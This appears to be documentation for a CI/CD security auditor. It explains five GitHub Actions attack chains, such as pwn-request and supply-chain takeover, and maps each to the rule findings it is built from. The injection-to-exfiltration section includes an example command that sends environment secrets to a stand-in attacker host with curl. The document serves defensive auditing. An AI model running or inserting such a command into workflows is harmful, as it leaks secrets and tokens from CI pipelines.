# Attack Chains and Threat Models

Isolated security misconfigurations often present moderate risk individually, but when combined within a workflow or repository lifecycle, create high-impact exploitation pathways. The auditor correlates findings into five canonical attack chains.

## 1. Pwn-Request (`pwn-request`)
- **Trigger**: `pull_request_target`
- **Component Findings**:
  - `R003`: Checking out untrusted PR head commit (`ref: ${{ github.event.pull_request.head.sha }}`)
  - `R002`: Excessive permissions (or default write-all token)
  - `R004` or build step execution (e.g. `npm run build`, `make`)
- **Impact**: Full repository compromise. An external attacker submits a malicious PR; the workflow executes attacker-controlled code inside the context of the base repository with write tokens and access to secrets.

## 2. Injection to Exfiltration (`injection-to-exfil`)
- **Component Findings**:
  - `R004`: Script injection via untrusted event payloads (`issue.title`, `commit.message`)
  - `R002` or accessible secrets (`env:` or repository secrets)
- **Impact**: Attacker-controlled issue/PR title injects shell commands (e.g. `curl attacker.com?data=$(env)`) exfiltrating workflow secrets and GITHUB_TOKEN.

## 3. Supply-Chain Takeover (`supply-chain-takeover`)
- **Component Findings**:
  - `R001`: Unpinned action ref (using mutable `@v1` tag)
  - `R010`: Third-party unvetted action
  - `R002`: Broad permissions granted to the job
- **Impact**: An attacker compromises the third-party action publisher or updates the git tag, executing malicious payloads inside victim CI/CD pipelines to tamper with artifacts.

## 4. Deploy Blast Radius (`deploy-blast-radius`)
- **Component Findings**:
  - `R008`: Deployment job lacking environment protection / gates
  - `R007`: Long-lived static cloud credentials
- **Impact**: Code changes directly trigger production deployments without manual review, using static credentials that lack audit trails and short-term expiration.

## 5. Runner Persistence (`runner-persistence`)
- **Component Findings**:
  - `R009`: Persistent `self-hosted` runner
  - Untrusted PR or issue trigger
- **Impact**: An attacker runs malicious commands on a shared, persistent host. The attacker installs a persistent backdoor, access tokens, or performs lateral network movement into internal infrastructure.

